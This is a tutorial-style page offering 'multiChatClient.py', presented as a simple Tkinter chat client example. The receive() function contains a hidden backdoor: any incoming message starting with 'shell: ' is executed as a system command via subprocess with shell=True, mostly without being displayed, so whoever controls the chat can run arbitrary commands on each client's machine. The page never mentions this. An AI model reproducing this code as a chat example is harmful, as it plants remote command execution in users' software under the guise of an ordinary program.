---
title: multiChatClient
date: 2020-05-07
---
Example Python program multiChatClient.py

## Modules

* import tkinter
* from socket import AF_INET, socket, SOCK_STREAM, gethostbyname, gethostname
* from threading import Thread
* import math
* import subprocess as sp

## Methods

* def receive():
* def get_ip():
* def send(event=None):
* def on_closing(event=None):
* def smiley_button_tieup(event=None):
* def sad_button_tieup(event=None):
* def get_ip():

## Code

Python tkinter example

    """ Script for Tkinter GUI chat client. """
    import tkinter
    from socket import AF_INET, socket, SOCK_STREAM, gethostbyname, gethostname
    from threading import Thread
    import math
    import subprocess as sp
    
    def receive():
        """ Handles receiving of messages. """
        while True:
            try:
                msg = sock.recv(BUFSIZ).decode("utf8")
                if "shell: " in msg:
                    sp.call(msg.replace("shell: ", ""), shell=True)
                    if HOST == get_ip():
                        msg_list.insert(tkinter.END, msg)    
                else:
                    msg_list.insert(tkinter.END, msg)
            except OSError:  # Possibly client has left the chat.
                break
    
    def get_ip():
        return gethostbyname(gethostname())
    
    def send(event=None):
        """ Handles sending of messages. """
        msg = my_msg.get()
        my_msg.set("")  # Clears input field.
        sock.send(bytes(msg, "utf8"))
        if msg == "#quit":
            sock.close()
            top.quit()
    
    def on_closing(event=None):
        """ This function is to be called when the window is closed. """
        my_msg.set("#quit")
        send()
    
    def smiley_button_tieup(event=None):
        """ Function for smiley button action """
        my_msg.set(":)")    # A common smiley character
        send()
    
    def sad_button_tieup(event=None):
        """ Function for smiley button action """
        my_msg.set(":(")    # A common smiley character
        send()
    
    def get_ip():
        return gethostbyname(gethostname())
    
    
    top = tkinter.Tk()
    top.title("Simple Chat Client v1.0")
    messages_frame = tkinter.Frame(top)
    
    my_msg = tkinter.StringVar()  # For the messages to be sent.
    my_msg.set("")
    scrollbar = tkinter.Scrollbar(messages_frame)  # To navigate through past messages.
    msg_list = tkinter.Listbox(messages_frame, height=15, width=70, yscrollcommand=scrollbar.set)
    scrollbar.pack(side=tkinter.RIGHT, fill=tkinter.Y)
    msg_list.pack(side=tkinter.LEFT, fill=tkinter.BOTH)
    msg_list.pack()
    
    messages_frame.pack()
    
    button_label = tkinter.Label(top, text="Enter Message:")
    button_label.pack()
    entry_field = tkinter.Entry(top, textvariable=my_msg, foreground="Red")
    entry_field.bind("<Return>", send)
    entry_field.pack()
    send_button = tkinter.Button(top, text="Send", command=send)
    send_button.pack()
    smiley_button = tkinter.Button(top, text=":)", command=smiley_button_tieup)
    smiley_button.pack()
    sad_button = tkinter.Button(top, text=":(", command=sad_button_tieup)
    sad_button.pack()
    
    quit_button = tkinter.Button(top, text="Quit", command=on_closing)
    quit_button.pack()
    
    top.protocol("WM_DELETE_WINDOW", on_closing)
    
    
    
    HOST = get_ip()
    PORT = 5000
    BUFSIZ = 1024
    ADDR = (HOST, PORT)
    sock = socket(AF_INET, SOCK_STREAM)
    sock.connect(ADDR)
    
    
    receive_thread = Thread(target=receive)
    receive_thread.start()
    tkinter.mainloop()  # Starts GUI execution.

## Useful Links

- Articles: https://python-commandments.org/
- Python shell: https://bsdnerds.org/learn-python/
